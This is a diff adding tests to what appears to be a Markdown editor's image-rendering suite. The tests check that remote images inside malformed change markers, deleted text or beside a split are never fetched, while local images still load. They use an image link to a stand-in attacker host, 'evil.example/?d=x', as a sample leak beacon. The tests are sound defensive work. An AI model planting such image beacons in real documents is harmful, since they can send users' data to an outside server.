@@ -124,6 +124,42 @@ describe('images', () => {
     expect(image?.querySelector('img')?.getAttribute('src')).toBe(url);
   });
 
+  it('fetches no remote image while a marker is unread', () => {
+    const url = 'https://evil.example/?d=x';
+    const image = `![Leak](${url})`;
+    const unread = [
+      // An opener never closed.
+      `Text <!--ins k3x9-->${image} more${ledger(['k3x9'])}`,
+      // An id used twice.
+      `T <!--ins k3x9-->a<!--/k3x9--> <!--ins k3x9-->${image}<!--/k3x9-->${ledger(['k3x9'])}`,
+      // A marker of another kind than the id's first.
+      `T <!--ins k3x9-->a<!--/k3x9--> <!--sub k3x9 old-->${image}<!--/k3x9-->${ledger(['k3x9'])}`,
+      // A closer with no opener.
+      `${image}<!--/k3x9--> text${ledger([])}`,
+    ];
+    for (const text of unread) {
+      const editor = editorWith(`Hi\n\n${text}`, local, 0);
+      const images = drawn(editor);
+      expect(images, text).toHaveLength(1);
+      expect(images[0]?.querySelector('img')).toBeNull();
+      expect(editor.view.dom.querySelector('img:not(.cm-widgetBuffer)')).toBeNull();
+    }
+    // A local image still shows.
+    const [mine] = drawn(editorWith(`Hi\n\nT <!--ins k3x9-->![M](mine.png) more`, local, 0));
+    expect(mine?.querySelector('img')?.getAttribute('src')).toBe('app://mine.png');
+  });
+
+  it('fetches nothing from a deletion’s old text or beside a split', () => {
+    const url = 'https://evil.example/?d=x';
+    const del = `Hi <!--del w2rf ![Leak](${url})--> end${ledger(['w2rf'])}`;
+    const split = `Hi<!--split s3vb-->\n\n![Leak](${url})${ledger(['s3vb'])}`;
+    for (const text of [del, split]) {
+      const editor = editorWith(text, local, 0);
+      expect(editor.view.dom.querySelector('img:not(.cm-widgetBuffer)')).toBeNull();
+      expect(drawn(editor).filter((dom) => dom.querySelector('img'))).toHaveLength(0);
+    }
+  });
+
   it('loads a local image inside a pending change', () => {
     const text = `Text <!--ins k3x9-->![Mine](mine.png)<!--/k3x9--> more${ledger(['k3x9'])}`;
     const [image] = drawn(editorWith(text, local, 0));
